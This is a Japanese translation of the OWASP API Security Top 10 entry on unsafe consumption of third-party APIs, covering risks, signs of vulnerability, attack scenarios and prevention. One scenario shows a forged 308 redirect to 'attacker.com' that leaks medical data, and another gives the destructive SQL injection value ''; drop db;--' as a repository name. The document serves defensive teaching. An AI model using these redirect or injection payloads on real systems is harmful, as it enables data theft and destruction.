# API10:2023 API の安全でない使用 (Unsafe Consumption of APIs)

| 脅威エージェント/攻撃手法 | セキュリティ上の弱点 | 影響 |
| - | - | - |
| API 依存 : 悪用難易度 **容易** | 普及度 **普通** : 検出難易度 **平均的** | 技術的影響 **重度** : ビジネス依存 |
| この問題を悪用するには攻撃者がターゲット API と統合している他の API やサービスを特定して潜在的に侵害することが必要です。通常、この情報は公開されていないか、統合している API やサービスを悪用することは容易ではありません。 | 開発者は外部 API やサードパーティ API とやり取りするエンドポイントを信頼はしても検証しない傾向にあり、トランスポートセキュリティ、認証、認可、入力バリデーションとサニタイズなど、より弱いセキュリティ要件に依存します。攻撃者はターゲット API が統合するサービス (データソース) を特定し、最終的にはそれらを侵害する必要があります。 | 影響はターゲット API が引き出されたデータに対して何を行うかによって異なります。悪用に成功すると、認可されていないアクターへの機密情報の漏洩、さまざまな種類のインジェクション、サービス拒否につながる可能性があります。 |

## その API は脆弱か？

開発者はサードパーティ API から受け取ったデータをユーザー入力よりも信頼する傾向があります。
これは特に有名企業が提供する API に当てはまります。
そのため、開発者はたとえば入力バリデーションやサニタイズに関して、より弱いセキュリティ標準を採用する傾向があります。


以下の場合、API は脆弱である可能性があります。

* 暗号化されていないチャネルを介して他の API とやり取りする場合。
* 他の API から収集したデータを処理する前やダウンストリームコンポーネントに渡す前に、適切にバリデーションとサニタイズを行っていない場合。

* リダイレクトに盲目的に従っている場合。
* サードパーティサービスのレスポンスを処理するために利用できるリソースの数を制限していない場合。

* サードパーティサービスとのやり取りにタイムアウトを実装していない場合。

## 攻撃シナリオの例

### シナリオ #1

ある API はユーザーが提供するビジネスアドレスを充実させるためにサードパーティサービスに依存しています。
エンドユーザーによって API にアドレスが提供されると、そのアドレスはサードパーティサービスに送信され、返されたデータはローカルの SQL 対応データベースに保存されます。



悪意のあるアクターはサードパーティサービスを使用して、自分が作成したビジネスに関連する SQLi ペイロードを保存します。
それから、脆弱な API に特定の入力を与えて、サードパーティサービスから「悪意のあるビジネス」を引き出します。
SQLi ペイロードは最終的にデータベースによって実行され、データは攻撃者のコントロール下にあるサーバーに流出します。



### シナリオ #2

ある API は機密性の高いユーザーの医療情報を安全に保存するためにサードパーティサービスと統合しています。
データは以下のような HTTP リクエストを使用してセキュアコネクションを介して送信されます。


```
POST /user/store_phr_record
{
  "genome": "ACTAGTAG__TTGADDAAIICCTT…"
}
```

悪意のあるアクターはサードパーティ API を侵害する方法を発見し、前述のようなリクエストに対して `308 Permanent Redirect` でレスポンスするようになりました。


```
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
```

その API はサードパーティのリダイレクトに盲目的に従うため、ユーザーの機密データを含むまったく同じリクエストを繰り返しますが、今度は攻撃者のサーバーに送られます。



### シナリオ #3

攻撃者は `'; drop db;--` という名前の git リポジトリを用意できます。

ここで、攻撃されたアプリケーションから悪意のあるリポジトリとの統合が行われると、リポジトリの名前が安全な入力であると信じて SQL クエリを構築するアプリケーションで SQL インジェクションペイロードが使用されます。



## 防止方法

* サービスプロバイダを評価する際には、API セキュリティ態勢を評価します。
* すべての API インタラクションが安全な通信チャネル (TLS) 上で行われることを確認します。
* 統合された API から受け取ったデータを使用する前に、常にバリデーションとサニタイズを行います。

* 統合された API がリダイレクトする可能性のあるよく知られた場所の許可リストを保守します。リダイレクトに盲目的に従ってはいけません。



## 参考資料

### OWASP

* [Web Service Security Cheat Sheet][1]
* [Injection Flaws][2]
* [Input Validation Cheat Sheet][3]
* [Injection Prevention Cheat Sheet][4]
* [Transport Layer Protection Cheat Sheet][5]
* [Unvalidated Redirects and Forwards Cheat Sheet][6]

### その他

* [CWE-20: Improper Input Validation][7]
* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]
* [CWE-319: Cleartext Transmission of Sensitive Information][9]

[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html
[2]: https://www.owasp.org/index.php/Injection_Flaws
[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html
[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
[7]: https://cwe.mitre.org/data/definitions/20.html
[8]: https://cwe.mitre.org/data/definitions/200.html
[9]: https://cwe.mitre.org/data/definitions/319.html
